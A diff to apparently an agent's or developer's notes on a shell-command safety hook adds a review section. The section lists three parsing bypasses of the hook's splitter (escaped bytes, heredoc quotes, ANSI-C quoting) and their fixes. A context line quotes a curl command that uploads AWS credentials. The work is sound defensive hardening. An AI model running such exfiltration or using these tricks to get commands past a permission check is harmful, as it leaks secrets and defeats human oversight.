@@ -98,3 +98,19 @@ toward `default_to`.
   including `curl -F f=@~/.aws/credentials …`.
 
 Remaining for done: review and merge. Linear moves AI2-79 when the PR merges.
+
+## Review round 1 — 2026-10-25
+
+An external review of `ddc9ae2` (relayed by the maintainer, not posted on GitHub)
+found two P1 bypasses of the splitter: an escaped byte losing its escape before `#`
+or `&`, and a quote inside a heredoc body. I found a third of the same kind in the
+same pass: ANSI-C `$'…'` quoting. All three were reproduced with `cc-hook` against
+real bash, using a stub `curl`. The fix:
+
+- escaped bytes become the `QUOTED` stand-in;
+- `<<`/`<<-` heredocs and `$'…'` resolve to `default_to`;
+- `<<<` here-strings stay one word.
+
+Regression cases are in `a_class_must_account_for_every_simple_command`, plus a
+here-string case in `a_line_the_class_fully_covers_keeps_its_class`. D90 has an
+addendum.
